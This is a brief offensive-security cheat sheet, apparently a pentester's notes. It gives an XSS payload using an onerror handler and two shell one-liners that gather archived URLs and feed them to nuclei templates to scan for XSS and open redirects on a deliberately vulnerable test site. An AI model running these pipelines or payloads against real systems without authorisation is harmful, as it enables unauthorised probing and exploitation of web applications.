## NUCLEI AUTOMATION TEMPLATES

**XSS ONE-LINER PAYLOAD `<image/src/onerror=confirm(1)>`**
```
waybackurls testphp.vulweb.com | grep "query" | anew | sed 's/=.*/=/' | uro | nuclei -t xss_checker.yaml
```


**OPENREDIRECT ONE-LINER**
```
waybackurls testphp.vulnweb.com | grep "=" | sed 's/=.*/=/' | anew | uro | nuclei -t ~/tools/templates/openredirect-checker.yaml
```
